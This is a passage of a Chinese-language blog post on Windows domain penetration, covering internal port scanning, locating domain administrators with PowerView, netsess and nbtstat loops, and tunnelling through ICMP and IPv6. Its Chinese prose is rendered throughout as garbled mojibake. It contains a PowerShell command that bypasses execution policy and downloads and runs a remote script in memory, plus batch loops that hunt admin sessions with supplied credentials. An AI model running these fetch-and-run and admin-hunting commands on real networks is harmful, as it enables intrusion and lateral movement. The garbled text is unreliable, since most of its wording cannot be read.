situational_awareness/network/arpscan</code></li><li>ä½¿ç”¨Nishangä¸­çš„Invoke-ARPScan.ps1è„šæœ¬</li><li>ä½¿ç”¨TCPã€UDPç«¯å£æ‰«ææ¢æµ‹å†…ç½‘ï¼ŒScanLineå·¥å…·ï¼ˆä½¿ç”¨ä½“éªŒä¸æ˜¯å¾ˆå¥½ï¼‰</li></ol><p><strong>æ‰«æåŸŸå†…ç«¯å£</strong></p><p>å·¥å…·ä¸‹è½½ï¼š<a href="https://pan.wgpsec.org/public/4-%E5%90%8E%E6%B8%97%E9%80%8F%20&amp;%20%E5%9F%9F%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B">https://pan.wgpsec.org/public/4-%E5%90%8E%E6%B8%97%E9%80%8F%20&amp;%20%E5%9F%9F%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B</a></p><ol><li><p>åˆ©ç”¨telnetå‘½ä»¤æ‰«æ</p></li><li><p>sæ‰«æå™¨</p></li><li><p>MSFç«¯å£æ‰«æ</p></li><li><p>powershellçš„Invoke-portscan.ps1è„šæœ¬ï¼Œæ¨èä½¿ç”¨æ— æ–‡ä»¶å½¢å¼æ‰«æ</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs latex">powershell.exe -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#x27;);Invoke-Portscan -Hosts 192.168.1.0/24 -T 4 -ports &#x27;445,1433,8080,3389,80&#x27; -oA c:<span class="hljs-tag">\<span class="hljs-name">windows</span></span><span class="hljs-tag">\<span class="hljs-name">temp</span></span><span class="hljs-tag">\<span class="hljs-name">res</span></span>.txt&quot;<br></code></pre></td></tr></table></figure></li><li><p>Nishangçš„Invoke-PortScanæ¨¡å—</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">Invoke-PortScan -StartAddress <span class="hljs-number">192.168</span><span class="hljs-number">.250</span><span class="hljs-number">.1</span> -EndAddress <span class="hljs-number">192.168</span><span class="hljs-number">.250</span><span class="hljs-number">.255</span> -ResolveHost<br></code></pre></td></tr></table></figure></li><li><p>å¦‚æœå‘ç°äº†ç«¯å£ï¼Œå¯ä»¥ä½¿ç”¨å®¢æˆ·ç«¯è¿æ¥å·¥å…·æˆ–è€…ncè·å–æœåŠ¡ç«¯çš„Bannerä¿¡æ¯ï¼ˆéœ€è¦æ³¨æ„ä¸€äº›å¹³æ—¶çš„ç‰¹å®šç«¯å£ï¼‰</p></li></ol><p><strong>åŸŸç®¡ç†å‘˜å®šä½</strong></p><p>å½“è®¡ç®—æœºåŠ å…¥åŸŸåä¼šé»˜è®¤ç»™åŸŸç®¡ç†å‘˜èµ‹äºˆæœ¬åœ°ç³»ç»Ÿç®¡ç†å‘˜æƒé™ï¼ŒåŸŸç®¡ç†å‘˜ç»„çš„æˆå‘˜å‡å¯è®¿é—®æœ¬åœ°è®¡ç®—æœºï¼Œå¹¶ä¸”å…·å¤‡å®Œå…¨çš„æ§åˆ¶æƒé™ã€‚åœ¨åŸŸç½‘ç»œæ”»å‡»æµ‹è¯•ä¸­ï¼Œè·å–åŸŸå†…çš„ä¸€ä¸ªæ”¯ç‚¹åï¼Œéœ€è¦è·å–åŸŸç®¡ç†å‘˜çš„æƒé™ã€‚</p><p>å‡è®¾ç°åœ¨åœ¨WindowsåŸŸä¸­å–å¾—äº†æ™®é€šç”¨æˆ·æƒé™ï¼Œå¸Œæœ›åœ¨åŸŸä¸­æ¨ªå‘ç§»åŠ¨ï¼Œéœ€è¦æ‰¾åˆ°åŸŸå†…ç”¨æˆ·çš„ç™»å½•ä½ç½®ï¼Œä»–æ˜¯å¦æ˜¯ä»»ä½•ç³»ç»Ÿçš„æœ¬åœ°ç®¡ç†å‘˜ï¼Œä»–æ‰€å±çš„ç»„ï¼Œä»–æ˜¯å¦æœ‰å•è®¿é—®æ–‡ä»¶å…±äº«ç­‰ã€‚æšä¸¾ä¸»æœºï¼Œç”¨æˆ·å’Œç»„ï¼Œæœ‰åŠ©äºæ›´å¥½çš„äº†è§£åŸŸçš„å¸ƒå±€ã€‚</p><ol><li><p><code>psloggedon.exe</code> å¯ä»¥æŸ¥çœ‹æœ¬åœ°ç™»å½•çš„ç”¨æˆ·å’Œé€šè¿‡æœ¬åœ°è®¡ç®—æœºæˆ–è¿œç¨‹è®¡ç®—æœºçš„èµ„æºç™»å½•çš„ç”¨æˆ·ï¼ˆæŸäº›åŠŸèƒ½éœ€è¦ç®¡ç†å‘˜æƒé™ï¼‰</p><p>ä¸‹è½½ï¼š<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon</a></p></li><li><p><code>PVEFindADUser.exe</code> ç”¨äºæŸ¥æ‰¾æ´»åŠ¨ç›®å½•ç”¨æˆ·ç™»å½•çš„ä½ç½®ï¼Œæšä¸¾åŸŸç”¨æˆ·ï¼Œä»¥åŠåœ¨ç‰¹å®šè®¡ç®—æœºä¸Šç™»å½•çš„ç”¨æˆ·ï¼ŒåŒ…æ‹¬æœ¬åœ°ç”¨æˆ·ï¼Œé€šè¿‡RDPç™»å½•çš„ç”¨æˆ·ï¼Œç”¨äºè¿è¡ŒæœåŠ¡å’Œè®¡åˆ’ä»»åŠ¡çš„ç”¨æˆ·ã€‚ï¼ˆè¿è¡Œéœ€è¦ç®¡ç†å‘˜æƒé™ï¼‰</p><p>ä¸‹è½½ï¼š<a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</a></p></li><li><p><code>netview.exe</code>æšä¸¾å·¥å…·ï¼Œä½¿ç”¨äº†WinAPIæšä¸¾ç³»ç»Ÿï¼Œåˆ©ç”¨NetSessionEnumæ‰¾å¯»ç™»å½•ä¼šè¯ï¼Œåˆ©ç”¨NetShareEnumæ‰¾å¯»å…±äº«ï¼Œåˆ©ç”¨NetWkstaUserEnumæšä¸¾ç™»å½•ç”¨æˆ·ã€‚èƒ½å¤ŸæŸ¥è¯¢å…±äº«å…¥å£å’Œæœ‰ä»·å€¼çš„ç”¨æˆ·ï¼Œå¤§éƒ¨åˆ†åŠŸèƒ½ä¸éœ€è¦ç®¡ç†å‘˜æƒé™</p><p>ä¸‹è½½ï¼š<a href="https://github.com/mubix/netview/releases">https://github.com/mubix/netview/releases</a></p></li><li><p><code>Nmap</code>çš„NSEè„šæœ¬</p><ul><li><code>smbâ€”enum-domains.nse</code>ï¼šå¯¹åŸŸæ§è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œå¯ä»¥è·å–ä¸»æœºä¿¡æ¯ï¼Œç”¨æˆ·ï¼Œå¯ä½¿ç”¨å¯†ç ç­–ç•¥çš„ç”¨æˆ·</li><li><code>smbâ€”enum-users.nse</code>ï¼šæ¸—é€æµ‹è¯•æ—¶å¦‚æœè·å–åˆ°åŸŸå†…æŸå°ä¸»æœºçš„æƒé™ï¼Œä½†æ˜¯æƒé™æœ‰é™æ— æ³•è·å–æ›´å¤šçš„åŸŸç”¨æˆ·ä¿¡æ¯æ—¶ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªè„šæœ¬æ¥å¯¹åŸŸæ§åˆ¶å™¨è¿›è¡Œæ‰«æ</li><li><code>smbâ€”enum-shares.nse</code>ï¼šéå†è¿œç¨‹ä¸»æœºçš„å…±äº«ç›®å½•</li><li><code>smbâ€”enum-processes.nse</code>ï¼šå¯¹ä¸»æœºç³»ç»Ÿè¿›ç¨‹éå†ï¼Œä»è€ŒçŸ¥é“ç›®æ ‡ä¸»æœºè¿è¡Œäº†å“ªäº›è½¯ä»¶</li><li><code>smbâ€”enum-sessions.nse</code>ï¼šè·å–åŸŸå†…ä¸»æœºçš„ç”¨æˆ·ç™»å½•ä¼šè¯ï¼ŒæŸ¥çœ‹å½“å‰æ˜¯å¦æœ‰ç”¨æˆ·ç™»å½•</li><li><code>smbâ€”enum-discovery.nse</code>ï¼šæ”¶é›†ç›®æ ‡ä¸»æœºçš„ä¿¡æ¯ï¼ˆæ“ä½œç³»ç»Ÿï¼Œè®¡ç®—æœºåï¼ŒåŸŸåâ€¦â€¦â€¦â€¦ï¼‰</li></ul><p>è„šæœ¬ä¸‹è½½é“¾æ¥ï¼š<a href="https://nmap.org/nsedoc/scripts/">https://nmap.org/nsedoc/scripts/</a></p></li><li><p><code>PowerView</code>è„šæœ¬ï¼Œå®ƒæ˜¯<code>powershell</code>çš„è„šæœ¬ï¼Œæä¾›äº†è¾…åŠ©å®šä½å…³é”®ç”¨æˆ·çš„åŠŸèƒ½</p><p>ä¸‹è½½ï¼š<a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView">https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView</a></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs groovy">Get-<span class="hljs-attr">NetDomain:</span> è·å–å½“å‰ç”¨æˆ·æ‰€åœ¨åŸŸçš„åç§° <br>Get-<span class="hljs-attr">NetUser:</span> è·å–æ‰€æœ‰ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯ <br>Get-<span class="hljs-attr">NetDomainController:</span> è·å–æ‰€æœ‰åŸŸæ§åˆ¶å™¨çš„ä¿¡æ¯ <br>Get-<span class="hljs-attr">NetComputer:</span> è·å–åŸŸå†…æ‰€æœ‰æœºå™¨çš„è¯¦ç»†ä¿¡æ¯ <br>Get-<span class="hljs-attr">NetOU:</span> è·å–åŸŸä¸­çš„OUä¿¡æ¯ <br>Get-<span class="hljs-attr">NetGroup:</span> è·å–æ‰€æœ‰åŸŸå†…ç»„å’Œç»„æˆå‘˜ä¿¡æ¯ <br>Get-<span class="hljs-attr">NetFileServer:</span> æ ¹æ®SPNè·å–å½“å‰åŸŸä½¿ç”¨çš„æ–‡ä»¶æœåŠ¡å™¨ä¿¡æ¯ <br>Get-<span class="hljs-attr">NetShare:</span> è·å–å½“å‰åŸŸå†…æ‰€æœ‰ç½‘ç»œå…±äº«ä¿¡æ¯ <br>Get-<span class="hljs-attr">NetSession:</span> è·å–æŒ‡å®šæœåŠ¡å™¨çš„ä¼šè¯ <br>Get-<span class="hljs-attr">NetRDPSession:</span> è·å–æŒ‡å®šæœåŠ¡å™¨çš„è¿œç¨‹è¿æ¥ <br>Get-<span class="hljs-attr">NetProcess:</span> è·å–è¿œç¨‹ä¸»æœºçš„è¿›ç¨‹ <br>Get-<span class="hljs-attr">UserEvent:</span> è·å–æŒ‡å®šç”¨æˆ·çš„æ—¥å¿— <br>Get-<span class="hljs-attr">ADObiect:</span> è·å–æ´»åŠ¨ç›®å½•çš„å¯¹è±¡ <br>Get-<span class="hljs-attr">NetGPO:</span> è·å–åŸŸå†…æ‰€æœ‰çš„ç»„ç­–ç•¥å¯¹è±¡ <br>Get-<span class="hljs-attr">DomainPolicy:</span> è·å–åŸŸé»˜è®¤ç­–ç•¥æˆ–åŸŸæ§åˆ¶å™¨ç­–ç•¥ <br>Invoke-<span class="hljs-attr">UserHunter:</span> è·å–åŸŸç”¨æˆ·ç™»å½•çš„è®¡ç®—æœºä¿¡æ¯åŠè¯¥ç”¨æˆ·æ˜¯å¦æœ‰æœ¬åœ°ç®¡ç†å‘˜æƒé™ <br>Invoke-<span class="hljs-attr">ProcessHunter:</span> é€šè¿‡æŸ¥è¯¢åŸŸå†…æ‰€æœ‰çš„æœºå™¨è¿›ç¨‹æ‰¾åˆ°ç‰¹å®šç”¨æˆ· <br>Invoke-<span class="hljs-attr">UserEvenHunter:</span> æ ¹æ®ç”¨æˆ·æ—¥å¿—æŸ¥è¯¢æŸåŸŸç”¨æˆ·ç™»å½•è¿‡å“ªäº›åŸŸæœºå™¨ã€‚<br></code></pre></td></tr></table></figure></li><li><p>Empireçš„user_hunteræ¨¡å—</p></li></ol><p><strong>æŸ¥æ‰¾åŸŸç®¡ç†è¿›ç¨‹</strong></p><p>å‡è®¾ï¼šåœ¨æŸä¸ªå†…ç½‘ç¯å¢ƒä¸­è·å¾—äº†ä¸€ä¸ªåŸŸæ™®é€šç”¨æˆ·çš„æƒé™ï¼Œç„¶åææƒ<strong>è·å¾—äº†å½“å‰æœåŠ¡å™¨çš„æœ¬åœ°ç®¡ç†å‘˜æƒé™</strong>ï¼Œç„¶ååˆ†æå½“å‰æœåŠ¡å™¨çš„ç”¨æˆ·ç™»å½•åˆ—è¡¨ä»¥åŠä¼šè¯ä¿¡æ¯ï¼ŒçŸ¥é“äº†å“ªäº›ç”¨æˆ·ç™»å½•äº†è¿™å°æœåŠ¡å™¨ï¼Œä½†æ˜¯æœ€åå‘ç°å¯ä»¥è·å–æƒé™çš„ç™»å½•ç”¨æˆ·<strong>éƒ½ä¸æ˜¯åŸŸç®¡ç†è´¦æˆ·ï¼Œ</strong>åŒæ—¶<strong>æ²¡æœ‰åŸŸç®¡ç†å‘˜ç»„ä¸­çš„ç”¨æˆ·ç™»å½•è¿™å°æœåŠ¡å™¨</strong>ï¼Œå°±å¯ä»¥ä½¿ç”¨å¦ä¸€ä¸ªè´¦æˆ·å¹¶<strong>å¯»æ‰¾è¯¥è´¦æˆ·åœ¨å†…ç½‘å“ªå°æœºå™¨ä¸Šå…·æœ‰æƒé™</strong>ï¼Œ<strong>å†æšä¸¾è¿™å°æœºå™¨ä¸Šçš„ç™»å½•ç”¨æˆ·</strong>ï¼Œç„¶åç»§ç»­æ¸—é€æµ‹è¯•çŸ¥é“è·å¾—åŸŸç®¡ç†å‘˜æƒé™ä¸ºæ­¢ã€‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">net<span class="hljs-built_in"> group </span><span class="hljs-string">&quot;domain admins&quot;</span> /domain æ”¶é›†åŸŸç®¡ç†å‘˜åˆ—è¡¨<br>tasklist /v æŸ¥è¯¢è¿›ç¨‹å’Œè¿›ç¨‹æ‰€å±ç”¨æˆ·ï¼ˆæ³¨æ„ç®¡ç†å‘˜ç”¨æˆ·ï¼‰<br>net<span class="hljs-built_in"> group </span><span class="hljs-string">&quot;domain controllers&quot;</span> /domain æŸ¥è¯¢åŸŸæ§åˆ¶å™¨åˆ—è¡¨<br></code></pre></td></tr></table></figure><p>æ”¶é›†æ‰€æœ‰æ´»åŠ¨åŸŸçš„ä¼šè¯åˆ—è¡¨ï¼šä½¿ç”¨netsess.exe ï¼š<code>NetSess -h</code></p><p>äº¤å‰å¼•ç”¨åŸŸç®¡ç†å‘˜åˆ—è¡¨å’Œæ´»åŠ¨ä¼šè¯åˆ—è¡¨ï¼šè¿™æ ·å¯ä»¥ç¡®å®šå“ªäº›IPåœ°å€å…·æœ‰æ´»åŠ¨åŸŸä»¤ç‰Œï¼Œå¯ä»¥ä½¿ç”¨<code>netsess.exe</code>çš„windowså‘½ä»¤è¡Œã€‚å°†åŸŸæ§åˆ¶å™¨åˆ—è¡¨æ·»åŠ åˆ°dcs.txt å°†åŸŸç®¡ç†å‘˜åˆ—è¡¨æ·»åŠ åˆ°admins.txtä¸­ï¼Œå¹¶ä¸netsess.exeæ”¾åœ¨åŒä¸€ç›®å½•ä¸‹ï¼Œè¿è¡Œ</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">FOR /F <span class="hljs-symbol">%i</span> in (dcs.txt) do <span class="hljs-title">@echo</span> [+] Querying DC <span class="hljs-symbol">%i</span> &amp;&amp; <span class="hljs-title">@netsess</span> -h <span class="hljs-symbol">%i</span> <span class="hljs-number">2</span>&gt;<span class="hljs-keyword">null</span> &gt;sessions.txt &amp;&amp; FOR /F <span class="hljs-symbol">%a</span> in (admin.txt) DO <span class="hljs-title">@type</span> sessions.txt | <span class="hljs-title">@findstr</span> /I <span class="hljs-symbol">%a</span><br></code></pre></td></tr></table></figure><p>å¦‚æœç›®æ ‡æœºå™¨æ˜¯åœ¨åŸŸç³»ç»Ÿä¸­æ˜¯é€šè¿‡å…±äº«çš„æœ¬åœ°ç®¡ç†å‘˜è´¦æˆ·è¿è¡Œçš„ï¼Œå°±å¯ä»¥ä½¿ç”¨ä¸‹åˆ—è„šæœ¬æ¥æŸ¥è¯¢ç³»ç»Ÿä¸­çš„åŸŸç®¡ç†ä»»åŠ¡</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sas">FOR /F <span class="hljs-name">%i</span> <span class="hljs-meta">in</span> (ips.txt) <span class="hljs-meta">DO</span> @echo [+] <span class="hljs-name">%i</span> <span class="hljs-variable">&amp;&amp;</span> @tasklist /V /S <span class="hljs-name">%i</span> /U user /P password 2&gt;<span class="hljs-meta">NULL</span> &gt; <span class="hljs-meta">output</span>.txt <span class="hljs-variable">&amp;&amp;</span> FOR /F <span class="hljs-name">%n</span> <span class="hljs-meta">in</span> (name.txt) <span class="hljs-meta">DO</span> @type <span class="hljs-meta">output</span>.txt | findstr <span class="hljs-name">%n</span> &gt; <span class="hljs-meta">NULL</span> <span class="hljs-variable">&amp;&amp;</span> echo [!] <span class="hljs-name">%n</span> was found running a process <span class="hljs-meta">on</span> <span class="hljs-name">%i</span> <span class="hljs-variable">&amp;&amp;</span> pause<br>ips.txt ç³»ç»Ÿåˆ—è¡¨<br>names.txt åŸŸç®¡ç†å‘˜åˆ—è¡¨<br></code></pre></td></tr></table></figure><p>æŸäº›ç‰ˆæœ¬çš„windowsæ“ä½œç³»ç»Ÿå…è®¸ç”¨æˆ·é€šè¿‡NetBIOSæŸ¥è¯¢å·²ç»ç™»å½•ç”¨æˆ·ï¼Œå¯ä»¥è¿è¡Œä¸‹é¢è¿™ä¸ªå‘½ä»¤è¡Œè„šæœ¬æ‰«æè¿œç¨‹ç³»ç»Ÿæ´»è·ƒä¸­çš„ç®¡ç†å‘˜ä¼šè¯</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sas">for /F <span class="hljs-name">%i</span> <span class="hljs-meta">in</span> (ips.txt) <span class="hljs-meta">do</span> @echo [+] Checking <span class="hljs-name">%i</span> <span class="hljs-variable">&amp;&amp;</span> nbtstat -A <span class="hljs-name">%i</span> 2&gt;<span class="hljs-meta">NULL</span> &gt;nbsessions.txt <span class="hljs-variable">&amp;&amp;</span> FOR /F <span class="hljs-name">%n</span> <span class="hljs-meta">in</span> (admins.txt) <span class="hljs-meta">DO</span> @type nbsessions.txt | findstr /I <span class="hljs-name">%n</span> &gt; <span class="hljs-meta">NULL</span> <span class="hljs-variable">&amp;&amp;</span> echo [!] <span class="hljs-name">%n</span> was found logged <span class="hljs-meta">into</span> <span class="hljs-name">%i</span><br>ips.txt ç³»ç»Ÿåˆ—è¡¨<br>names.txt åŸŸç®¡ç†å‘˜åˆ—è¡¨<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ä½¿ç”¨<code>nbtscan</code>å·¥å…·</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">for /F <span class="hljs-name">%i</span> <span class="hljs-meta">in</span> (ips.txt) <span class="hljs-meta">do</span> @echo [+] Checking <span class="hljs-name">%i</span> <span class="hljs-variable">&amp;&amp;</span> nbtstat -f <span class="hljs-name">%i</span> 2&gt;<span class="hljs-meta">NULL</span> &gt;nbsessions.txt <span class="hljs-variable">&amp;&amp;</span> FOR /F <span class="hljs-name">%n</span> <span class="hljs-meta">in</span> (admins.txt) <span class="hljs-meta">DO</span> @type nbsessions.txt | findstr /I <span class="hljs-name">%n</span> &gt; <span class="hljs-meta">NULL</span> <span class="hljs-variable">&amp;&amp;</span> echo [!] <span class="hljs-name">%n</span> was found logged <span class="hljs-meta">into</span> <span class="hljs-name">%i</span><br></code></pre></td></tr></table></figure><p><strong>åŸŸåˆ†æå·¥å…·</strong>ï¼š<code>BloodHound</code></p><blockquote><p>ä»¥ä¸Šæåˆ°çš„å·¥å…·çš„å…·ä½“ä½¿ç”¨éœ€è¦ç»“åˆå®æˆ˜é¶åœº</p></blockquote><h4 id="éšè—é€šä¿¡éš§é“æŠ€æœ¯"><a href="#éšè—é€šä¿¡éš§é“æŠ€æœ¯" class="headerlink" title="éšè—é€šä¿¡éš§é“æŠ€æœ¯"></a>éšè—é€šä¿¡éš§é“æŠ€æœ¯</h4><p>ä¸€èˆ¬çš„ç½‘ç»œé€šä¿¡å°±æ˜¯å…ˆåœ¨ä¸¤å°æœºå™¨ä¹‹é—´å»ºç«‹TCPè¿æ¥ï¼Œç„¶åè¿›è¡Œæ­£å¸¸çš„æ•°æ®é€šä¿¡ã€‚</p><p>éš§é“ï¼šä¸€ç§ç»•è¿‡ç«¯å£å±è”½çš„é€šä¿¡æ–¹æ³•ã€‚é˜²ç«å¢™ä¸¤ç«¯çš„æ•°æ®æŠ¥é€šè¿‡é˜²ç«å¢™æ‰€å…è®¸çš„æ•°æ®åŒ…ç±»å‹æˆ–è€…ç«¯å£è¿›è¡Œå°è£…ï¼Œç„¶åç©¿è¿‡é˜²ç«å¢™ï¼Œä¸å¯¹æ–¹é€šä¿¡ã€‚å½“è¢«å°è£…çš„æ•°æ®åŒ…åˆ°è¾¾ç›®çš„åœ°æ—¶ï¼Œå°†æ•°æ®è¿˜åŸï¼Œå¹¶å°†è¿˜åŸçš„æ•°æ®åŒ…å‘é€åˆ°ç›¸åº”çš„æœåŠ¡å™¨ä¸Šã€‚</p><p>å¸¸ç”¨çš„éš§é“</p><ul><li>ç½‘ç»œå±‚ï¼šIPV6éš§é“ï¼ŒICMPéš§é“ï¼ŒGREéš§é“</li><li>ä¼ è¾“å±‚ï¼šTCPéš§é“ï¼ŒUDPéš§é“ï¼Œå¸¸è§„ç«¯å£è½¬å‘</li><li>åº”ç”¨å±‚ï¼šsshéš§é“ï¼ŒHTTPéš§é“ï¼ŒHTTPSéš§é“ï¼ŒDNSéš§é“</li></ul><h5 id="åˆ¤æ–­å†…ç½‘è¿é€šæ€§"><a href="#åˆ¤æ–­å†…ç½‘è¿é€šæ€§" class="headerlink" title="åˆ¤æ–­å†…ç½‘è¿é€šæ€§"></a>åˆ¤æ–­å†…ç½‘è¿é€šæ€§</h5><ol><li>ICMPåè®®ï¼š<code>ping</code></li><li>TCPåè®®ï¼š<code>netcat</code></li><li>HTTPåè®®ï¼š<code>curl</code></li><li>DNSåè®®ï¼š<code>nslookup</code>ï¼Œ<code>dig</code></li></ol><p>å¦‚æœé‡è§æµé‡ä¸èƒ½ç›´æ¥æµå‡ºï¼Œå†…ç½‘ä¸­æœ‰ä»£ç†æœåŠ¡å™¨æ—¶çš„åˆ¤æ–­æ–¹æ³•</p><ol><li><p>æŸ¥çœ‹å†…ç½‘ä¸­æ˜¯å¦å­˜åœ¨ç±»ä¼¼â€proxyâ€åç§°çš„æœºå™¨</p></li><li><p>æŸ¥çœ‹IEæµè§ˆå™¨çš„ç›´æ¥ä»£ç†</p></li><li><p>æ›´å…·pacæ–‡ä»¶çš„è·¯å¾„ï¼ˆæœ¬åœ°è·¯å¾„æˆ–è€…è¿œç¨‹è·¯å¾„ï¼‰ï¼Œå°†å…¶ä¸‹è½½æŸ¥çœ‹</p></li><li><p>åˆ©ç”¨curlå·¥å…·ç¡®è®¤</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">curl www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>  <span class="hljs-comment">//ä¸é€š</span><br>curl -x proxy-ip:port www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span> <span class="hljs-comment">//é€š</span><br></code></pre></td></tr></table></figure></li></ol><h5 id="ç½‘ç»œå±‚éš§é“æŠ€æœ¯"><a href="#ç½‘ç»œå±‚éš§é“æŠ€æœ¯" class="headerlink" title="ç½‘ç»œå±‚éš§é“æŠ€æœ¯"></a>ç½‘ç»œå±‚éš§é“æŠ€æœ¯</h5><p>åœ¨ç½‘ç»œå±‚ä¸­æœ€å¸¸ç”¨çš„éš§é“åè®®å°±æ˜¯IPv6å’ŒICMP</p><h6 id="IPv6éš§é“"><a href="#IPv6éš§é“" class="headerlink" title="IPv6éš§é“"></a><strong>IPv6éš§é“</strong></h6><p>IPv6éš§é“æŠ€æœ¯æ˜¯æŒ‡é€šè¿‡IPv4éš§é“ä¼ é€IPv6æ•°æ®æŠ¥æ–‡çš„æŠ€æœ¯ï¼Œå·¥ä½œåŸç†è¿‡ç¨‹ï¼š</p><ol><li>èŠ‚ç‚¹Aå‘èŠ‚ç‚¹Bå‘é€IPv6æŠ¥æ–‡ï¼Œé¦–å…ˆåœ¨èŠ‚ç‚¹Aå’ŒèŠ‚ç‚¹Bä¹‹é—´å»ºç«‹ä¸€ä¸ªéš§é“</li><li>èŠ‚ç‚¹Aå°†<strong>IPv6æŠ¥æ–‡å°è£…</strong>åœ¨ä»¥èŠ‚ç‚¹<strong>Bçš„IPv4åœ°å€ä¸ºç›®çš„åœ°</strong>ï¼Œä»¥<strong>è‡ªå·±çš„IPv4åœ°å€ä¸ºæºåœ°å€</strong>çš„<strong>IPv4æŠ¥æ–‡ä¸­å‘é€</strong></li><li>è¿™ä¸ªæŠ¥æ–‡å’Œæ™®é€šçš„IPv4æŠ¥æ–‡ä¸€æ ·ï¼Œç»è¿‡IPv4çš„è½¬å‘åˆ°è¾¾èŠ‚ç‚¹B</li><li>èŠ‚ç‚¹Bæ”¶åˆ°æ­¤æŠ¥æ–‡åï¼Œè§£é™¤IPv4å°è£…ï¼Œå–å‡ºå…¶ä¸­çš„IPv6æŠ¥æ–‡</li></ol><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210730095849745.png" alt="image-20210730095849745"></p><blockquote><p>å³ä½¿è®¾å¤‡æ”¯æŒIPv6ï¼Œä¹Ÿå¯èƒ½æ— æ³•æ­£ç¡®åˆ†æå°è£…äº†IPv6æŠ¥æ–‡çš„IPv4æ•°æ®åŒ…ã€‚</p><p>é…ç½®éš§é“å’Œè‡ªåŠ¨éš§é“çš„ä¸»è¦åŒºåˆ«ï¼šåªæœ‰åœ¨æ‰§è¡Œéš§é“åŠŸèƒ½çš„èŠ‚ç‚¹çš„IPv6åœ°å€æ˜¯IPv4å…¼å®¹åœ°å€æ—¶ï¼Œè‡ªåŠ¨éš§é“æ‰å¯è¡Œï¼Œä¸ºæ‰§è¡Œéš§é“åŠŸèƒ½çš„èŠ‚ç‚¹åˆ†é…IPåœ°å€æ—¶ï¼Œé‡‡ç”¨è‡ªåŠ¨éš§é“æ–¹æ³•å°±ä¸éœ€è¦è¿›è¡Œé…ç½®ï¼›é…ç½®éš§é“çš„æ–¹æ³•åˆ™è¦æ±‚éš§é“æœ«ç«¯èŠ‚ç‚¹ä½¿ç”¨å…¶ä»–æœºåˆ¶æ¥è·å¾—å…¶IPv4åœ°å€ï¼Œä¾‹å¦‚DHCPï¼Œäººå·¥é…ç½®æˆ–è€…å…¶ä»–IPv4çš„é…ç½®æœºåˆ¶</p></blockquote><p>æ”¯æŒIPv6çš„éš§é“å·¥å…·æœ‰<code>socat</code>ï¼Œ<code>6tunnel</code>ï¼Œ<code>nt6unnel</code>ç­‰</p><h6 id="ICMPéš§é“"><a href="#ICMPéš§é“" class="headerlink" title="ICMPéš§é“"></a><strong>ICMPéš§é“</strong></h6><p>å¦‚æœæ”»å‡»è€…ä½¿ç”¨å„ç±»ä¸Šå±‚éš§é“ï¼ˆHTTPéš§é“ï¼ŒDNSéš§é“ï¼Œå¸¸è§„æ­£/åå‘ç«¯å£è½¬å‘ç­‰ï¼‰çš„æ“ä½œéƒ½å¤±è´¥äº†ï¼Œå¯ä»¥ä½¿ç”¨pingå‘½ä»¤å°è¯•å»ºç«‹ICMPéš§é“ï¼Œå°†TCP/UDPæ•°æ®å°è£…åˆ°ICMPçš„pingæ•°æ®åŒ…ä¸­ï¼Œä»è€Œç©¿è¿‡é˜²ç«å¢™ã€‚</p><p>å¸¸è§å·¥å…·</p><ol><li><p><code>icmpsh</code>ï¼š<a href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a></p><p>ä½¿ç”¨çš„æ³¨æ„äº‹é¡¹ï¼š</p><ul><li>éœ€è¦å®‰è£…<code>python-impacket</code>ç±»</li><li>éœ€è¦å…³é—­æœ¬åœ°ç³»ç»Ÿçš„ICMPåº”ç­”ï¼Œ<code>sysctl -w 